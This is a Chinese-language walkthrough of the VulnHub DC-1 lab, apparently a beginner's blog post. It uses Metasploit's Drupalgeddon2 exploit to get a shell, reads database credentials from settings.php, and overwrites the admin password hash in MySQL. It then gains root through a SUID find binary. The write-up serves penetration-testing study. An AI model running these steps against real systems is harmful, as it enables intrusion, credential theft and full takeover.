# 基本信息

在VulnHub上下载DC1靶机，32位Debian系统

靶机设置：

![1603874459_5f992e9be833c4d0d1cdf.png!small](https://image.3001.net/images/20201028/1603874459_5f992e9be833c4d0d1cdf.png!small)

攻击机：Kali2020.4

# 信息收集

由于靶机使用NAT，那么靶机就和我的攻击机出于同一个虚拟局域网中，查看本机IP信息，一边扫描时排除本机：

![1603874492_5f992ebc9dbf7d8d2d74d.png!small](https://image.3001.net/images/20201028/1603874492_5f992ebc9dbf7d8d2d74d.png!small)

可见本机IP位192.168.187.130，子网网段为192.168.187.0/24

使用nmap扫描该网段：

![1603874506_5f992ecaa167da01a9bea.png!small](https://image.3001.net/images/20201028/1603874506_5f992ecaa167da01a9bea.png!small)

可以得到靶机IP **192.168.187.133** 及其开放的端口。

注意到80端口开放，那么首先访问 **<http://192.168.187.133>** :

![1603874531_5f992ee31e3b392461f50.png!small](https://image.3001.net/images/20201028/1603874531_5f992ee31e3b392461f50.png!small)

利用firfox的 **Wappalyzer插件**
快速得到网站的基本信息，注意到网站有登录功能，那么可以从数据库方面下手。网站使用Drupal进行构建，Drupal使用的数据库是Mysql。先查好并记录下这些信息，以备不时之需。

下面可以使用 **dirb目录扫描工具** 进行进一步的信息探测，试图找出更多潜在的信息，但是由于权限问题，一般不会暴露有非常重要的信息

![1603874539_5f992eeb3a4e196d7ea8b.png!small](https://image.3001.net/images/20201028/1603874539_5f992eeb3a4e196d7ea8b.png!small)

# 漏洞扫描

在上一步收集了信息之后，那么就可以进一步进行漏洞扫描了。这里漏洞扫描和入侵都是用 **Metasploit框架** 进行，首先在命令行输入

    
    
    msfconsole

打开metasploit框架的命令行界面：

![1603874548_5f992ef49671433d7e2b0.png!small](https://image.3001.net/images/20201028/1603874548_5f992ef49671433d7e2b0.png!small)

首先从Drupal入手试图找到可以利用的漏洞，在命令行中输入

    
    
    msf5 > search Drupal

得到如下结果：

![1603874555_5f992efb915af27563093.png!small](https://image.3001.net/images/20201028/1603874555_5f992efb915af27563093.png!small)

既然已经知道了可以利用的漏洞，那么接下来就可以试图进行入侵了

# 实施入侵

继续使用Metasploit框架，在扫描可利用的漏洞之后，选择第4个漏洞进行利用。在命令行键入：

    
    
    msf5 > use 4 // 或是使用下面一条指令  
    msf5 > use exploit/unix/webapp/drupal_drupalgeddon2

进入exploit的设置界面，输入show options查看需要配置的选项：

![1603874563_5f992f038b40e052c5e25.png!small](https://image.3001.net/images/20201028/1603874563_5f992f038b40e052c5e25.png!small)

只要配置了rhosts为靶机IP即可使用exploit，命令行先后键入

    
    
    msf5 > set rhosts 192.168.187.133  
    msf5 > exploit

exploit执行，意外发现可以直接建立起一个session（如果没建立起session，可以先尝试其他的exploit，若全部无法建立session再做考虑）：

![1603874572_5f992f0c4c3defe7e9376.png!small](https://image.3001.net/images/20201028/1603874572_5f992f0c4c3defe7e9376.png!small)

![1603874598_5f992f2688980d830b007.png!small](https://image.3001.net/images/20201028/1603874598_5f992f2688980d830b007.png!small)

# 横向入侵(Looting)

（暂时不清楚术语是不是这个名词，待查证）

那么现在建立了一个Session之后，就正式标志着我们进入了靶机，完成了渗透的第一步。那么首先先切换到交互性的shell进行操作：

    
    
    meterpreter > shell  
    // 进入shell之后  
    python -c 'import pty;pty.spawn("/bin/bash")'

获取一些基本信息，例如当前目录，当前用户等：![1603874620_5f992f3c6ff3f1f240c99.png!small](https://image.3001.net/images/20201028/1603874620_5f992f3c6ff3f1f240c99.png!small)

可以发现，这里应该是服务器的根目录，在这里可以找到第一个flag：

    
    
    cat flag1.txt

![1603874632_5f992f48a734fda515be3.png!small](https://image.3001.net/images/20201028/1603874632_5f992f48a734fda515be3.png!small)

根据提示，下面应该去网站的设置文件中寻找线索。经过百度，可知Drupal的配置文件放在sites/default文件夹中，打开文件夹：

![1603874644_5f992f5458590f74328d4.png!small](https://image.3001.net/images/20201028/1603874644_5f992f5458590f74328d4.png!small)

打开settings.php文件（因为另一个多半是默认的自动设置的配置，所以先不看）：![1603874703_5f992f8f09d6065c453e2.png!small](https://image.3001.net/images/20201028/1603874703_5f992f8f09d6065c453e2.png!small)

文件开头就出现了劲爆的信息——flag2和数据库的设置！现在我们获得了mysql数据库其中一个用户的用户名与密码，那么下一步就先搜索一下数据库吧。

在命令行键入如下指令，使用获得的用户名与密码登录mysql：

![1603874654_5f992f5e0b0c59d15e199.png!small](https://image.3001.net/images/20201028/1603874654_5f992f5e0b0c59d15e199.png!small)

成功登录！接下来自然是获取一系列数据库的信息了。

![1603874672_5f992f701ee483c8edafc.png!small](https://image.3001.net/images/20201028/1603874672_5f992f701ee483c8edafc.png!small)

根据配置文件显示，我们需要关注的主要是drupaldb数据库，那么先进入该数据库查看有哪些表：

    
    
    use drupaldb;  
    show tables;

结果有80个表，归根结底，我们现在关心的是成为网站的管理员，那么现在看看有没有user一类的表，果不其然，其中有个表就叫users

![1603874687_5f992f7fc7b66d778e7f7.png!small](https://image.3001.net/images/20201028/1603874687_5f992f7fc7b66d778e7f7.png!small)

查看一下表的内容：

    
    
    select * from users;

![1603874696_5f992f88419aedfe25967.png!small](https://image.3001.net/images/20201028/1603874696_5f992f88419aedfe25967.png!small)

可以看到admin用户了，但是麻烦的是密码项应该是被hash过的，得想个办法更改admin的密码，或者干脆重新添加一个管理员权限的用户。

现在先尝试着更改密码吧，首先试试有没有写users表的权限：![1603874729_5f992fa955e31761d81e0.png!small](https://image.3001.net/images/20201028/1603874729_5f992fa955e31761d81e0.png!small)

结果上看似乎是可以的，那么就没必要费心思去做sql注入了，下面唯一的障碍就是寻找对应的hash算法。

经过资料查阅，可以知道Drupal将密码的hash操作交给了scripts/password-hash.sh来进行了，那么剩下的事就简单了，只需要利用这个脚本更改一下密码即可。

    
    
    // 先回到服务器根目录
    scripts/password-hash.sh 123456 // 计算一个123456的hash值

可以得到结果：

![1603874736_5f992fb0580328b43f5c2.png!small](https://image.3001.net/images/20201028/1603874736_5f992fb0580328b43f5c2.png!small)

使用这个hash值去更新users表即可，注意hash值要以字符串形式存储：

    
    
    update users set pass="$S$DMVVSFGrb1hV0B5YXHm01jvMGmIIq1YuQP./KolpcLSes16RcEIv" where uid=1;

![1603874743_5f992fb7e280e075246ff.png!small](https://image.3001.net/images/20201028/1603874743_5f992fb7e280e075246ff.png!small)

似乎是成功了，那么现在去登陆一下网站吧：

![1603874748_5f992fbc7d9167f2d83fa.png!small](https://image.3001.net/images/20201028/1603874748_5f992fbc7d9167f2d83fa.png!small)

成功了！那么现在先翻一翻这个网站有什么内容吧，结果在content中可以找到flag3：

![1603874759_5f992fc73c6e84dadcf2e.png!small](https://image.3001.net/images/20201028/1603874759_5f992fc73c6e84dadcf2e.png!small)![1603874762_5f992fcac3ce3c7d28f22.png!small](https://image.3001.net/images/20201028/1603874762_5f992fcac3ce3c7d28f22.png!small)

至此，服务器的根目录算是探索完了，现在该去系统根目录试试运气了：

    
    
    cd /
    ls

翻来翻去可以在home目录下面找到flag4

![1603874767_5f992fcfcb3d11ea48c7c.png!small](https://image.3001.net/images/20201028/1603874767_5f992fcfcb3d11ea48c7c.png!small)

![1603874807_5f992ff77d497620bb695.png!small](https://image.3001.net/images/20201028/1603874807_5f992ff77d497620bb695.png!small)

# 提权

根据之前flag4得到的提醒，最终的flag在root目录下，而要进入root目录，显而易见地需要进行提权。

 **（由于对提权不清楚，可能会有很多错误）**

查阅资料，现暂时只初步认识了SUID提权：

 **概念**
：SUID是一种Linux的权限机制，指某可执行程序在执行时将会使调用者暂时得到被执行程序的权限，如果被执行程序可以执行脚本或指令的话，就可以利用这个脚本或指令进行提权。

 **典型例子** ：

  * Nmap

  * Vim

  * find

  * Bash

  * More

  * Less

  * Nano

  * cp

那么首先先找找系统中有没有具有root权限的这些指令呢：

    
    
    find / -user root -perm -4000 -print 2>/dev/null

![1603874825_5f9930090b6f37ff6b1dd.png!small](https://image.3001.net/images/20201028/1603874825_5f9930090b6f37ff6b1dd.png!small)

正好find指令就是root权限，那么接下来就去查以下find提权的资料吧。

 **原理：** find指令可以有一个-exec的输入，可以执行一条指令或是一个脚本。若find是root权限，那么这条指令或脚本将以root权限执行

通用的方式如下：

    
    
    find [文件名] -exec [想执行的命令] \;

注意只有当[文件名]对应的文件存在时，之后的命令才会执行。

那么接下来就去一个允许写的目录下随便创建一个文件吧。回到一开始的服务器根目录/var/www，在这里创建一个文件并进行提权：

    
    
    touch super  
    find super -exec "/bin/sh" \;  
    // 执行完后验证一下权限  
    whoami

![1603874846_5f99301eb9aad15d55fa2.png!small](https://image.3001.net/images/20201028/1603874846_5f99301eb9aad15d55fa2.png!small)

提权成功了！至此成功拿到root权限，来到/root文件夹下，找到最终的flag

![1603874852_5f993024c7f3ab320ad1d.png!small](https://image.3001.net/images/20201028/1603874852_5f993024c7f3ab320ad1d.png!small)

# 总结

这是我第一次完整地进行一次渗透测试，中途也遇到了很多的问题，但是经过资料查阅，最后成功攻破靶机，这样的成就感真的让我十分愉快，希望自己在今后的学习中对渗透测试要保持同样的热情。下面对本次渗透测试的过程总结如下：

  * 首先资料收集尽可能地多做，遇到特殊的端口，比如80这种就要留个心眼，多半会是突破口

  * Metasploit框架真的很好用，扫描和利用都很方便

  * 在进入了靶机之后，尽可能多的收集信息（Looting），要奉行三光政策

  * 提权是很重要的一个部分，成功与否决定着是否能够完全攻破靶机

尚需完善的知识点：

  * 信息收集不只是nmap，还要学习其他的工具

  * Metasploit还有很多功能，需要进一步学习

  * 对mysql不是很熟

  * 提权现在只是初步了解了SUID提权，还需进一步学习

最后，希望路过的大佬不吝赐教！以上。

